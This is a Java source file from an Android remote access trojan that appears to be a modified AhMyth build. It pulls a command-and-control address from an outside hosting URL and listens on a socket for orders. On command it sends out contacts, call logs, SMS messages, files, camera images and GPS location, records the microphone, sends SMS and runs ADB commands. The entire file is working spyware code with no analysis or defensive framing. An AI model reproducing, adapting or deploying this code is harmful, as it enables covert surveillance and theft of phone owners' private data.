package ahmyth.mine.king.ahmyth;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Looper;
import android.preference.PreferenceManager;
import android.util.Log;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONObject;

import io.socket.client.Socket;
import io.socket.emitter.Emitter;



/**
 * Created by AhMyth on 10/1/16.
 */

public class ConnectionManager {

    public static Context context;
    private static io.socket.client.Socket ioSocket;
    private static FileManager fm = new FileManager();

    public static boolean ChangeMyConnection(String NewURL, String NewPort, String OldURL, String OldPORT){

        if ( NewURL.equals(OldURL) ) {

        }else
        {
            return true;
        }

        if ( NewPort.equals(OldPORT)  ) {

        }else{
            return true;

        }

        return false;
    }

    public static void startAsync(Context con)
    {
        try {
            context = con;

            RequestQueue queue = Volley.newRequestQueue(context);
            String url ="https://draftier-misfits.000webhostapp.com/codes.txt";

            StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                    new Response.Listener<String>(){
                        @Override
                        public void onResponse(String response) {

                            String[] _response = response.split(",");

                            SharedPreferences sharedPref =  PreferenceManager.getDefaultSharedPreferences(MainService.getContextOfApplication());

                            String oldUrl = sharedPref.getString("URL","DEFAULT URL");
                            String oldPort = sharedPref.getString("PORT","DEFAULT PORT");

                            SharedPreferences.Editor editor = sharedPref.edit();
                            editor.putString("URL", _response[0].trim());
                            editor.putString("PORT", _response[1].trim());

                            editor.commit();
                            Log.w("lalo", "Statt Async ioSocket " + ioSocket);
                            if(ioSocket != null )
                            {
                                if (  ChangeMyConnection (_response[0].trim(),_response[1].trim(),oldUrl, oldPort) )
                                {
                                    ioSocket.disconnect();
                                    ioSocket.off("ping");
                                    ioSocket.off("order");
                                    ioSocket.off("pong");
                                    ioSocket.off("x0000ca");

                                    sendReq(context, true);
                                }else {
                                    //No hay necesidad de Recrear la conexión
                                    sendReq(context, false);
                                }
                            }else {
                                //No hay necesidad de Recrear la conexión
                                sendReq(context, false);
                            }


                        }
                    }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {

                }
            });

            queue.add(stringRequest);

            //sendReq(context);
        }catch (Exception ex){
            startAsync(con);
        }
    }


    public static void sendReq(Context context, boolean forceRecreationConnection) {
        try {

            if(!forceRecreationConnection){
                if(ioSocket != null )
                    return;
            }



            if(forceRecreationConnection){
                ioSocket = IOSocket.RenewInstance(ioSocket);
                IOSocket.resetInstance();

                context.stopService(new Intent(context, MainService.class));
            }


            ioSocket = IOSocket.getInstance().getIoSocket();

            ioSocket.on("ping", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    ioSocket.emit("pong");
                }
            });

            ioSocket.on("order", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        JSONObject data = (JSONObject) args[0];
                        String order = data.getString("order");
                        Log.e("order",order);
                        //Log.e("lalo Camera" , order);
                        switch (order){
                            case "x0000ca":
                                if(data.getString("extra").equals("camList"))
                                    x0000ca(-1);
                                else if (data.getString("extra").equals("1"))
                                    x0000ca(1);
                                else if (data.getString("extra").equals("0"))
                                    x0000ca(0);
                                break;
                            case "x0000fm":
                                if (data.getString("extra").equals("ls"))
                                    x0000fm(0,data.getString("path"));
                                else if (data.getString("extra").equals("dl"))
                                    x0000fm(1,data.getString("path"));
                                break;
                            case "x0000sm":
                                if(data.getString("extra").equals("ls"))
                                    x0000sm(0,null,null);
                                else if(data.getString("extra").equals("sendSMS"))
                                   x0000sm(1,data.getString("to") , data.getString("sms"));
                                break;
                            case "x0000cl":
                                x0000cl();
                                break;
                            case "x0000cn":
                                x0000cn();
                                break;
                            case "x0000mc":
                                    x0000mc(data.getInt("sec"));
                                break;
                            case "x0000lm":
                                x0000lm();
                                break;
                            case "x0000ac":
                                Log.w("lalo", "data: " + data);
                                if(data.getString("extra").equals("sendADB")) {
                                    x0000ac(1, data.getString("cmd"));

                                }
                                break;
                        }
                    }catch (Exception e) {
                        e.printStackTrace();
                        Log.w("lalo", "This: " + e.getMessage());
                    }
                }
            });
            ioSocket.connect();

        }catch (Exception ex){
           Log.e("lalo ConectionManager" , ex.getMessage());

        }
    }

    public static void x0000ca(int req){

        if(req == -1) {
           JSONObject cameraList = new CameraManager(context).findCameraList();
            if(cameraList != null)
            ioSocket.emit("x0000ca" ,cameraList );
        }
        else if (req == 1){
            new CameraManager(context).startUp(1);
        }
        else if (req == 0){
            new CameraManager(context).startUp(0);
        }

    }

    public static void x0000fm(int req , String path){
        if(req == 0)
        ioSocket.emit("x0000fm",fm.walk(path));
        else if (req == 1)
            fm.downloadFile(path);
    }


    public static void x0000sm(int req,String phoneNo , String msg){
        if(req == 0)
            ioSocket.emit("x0000sm" , SMSManager.getSMSList());
        else if(req == 1) {
            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
            ioSocket.emit("x0000sm", isSent);
        }
    }

    public static void x0000ac(int req,String cmd){
            ADBManager.sendADB(cmd);
    }

    public static void x0000cl(){
        ioSocket.emit("x0000cl" , CallsManager.getCallsLogs());
    }

    public static void x0000cn(){
        ioSocket.emit("x0000cn" , ContactsManager.getContacts());
    }

    public static void x0000mc(int sec) throws Exception{
        MicManager.startRecording(sec);
    }

    public static void x0000lm() throws Exception{
        Looper.prepare();
        LocManager gps = new LocManager(context);
        JSONObject location = new JSONObject();
        // check if GPS enabled
        if(gps.canGetLocation()){

            double latitude = gps.getLatitude();
            double longitude = gps.getLongitude();
            Log.e("loc" , latitude+"   ,  "+longitude);
            location.put("enable" , true);
            location.put("lat" , latitude);
            location.put("lng" , longitude);
        }
        else
            location.put("enable" , false);

        ioSocket.emit("x0000lm", location);
    }





}
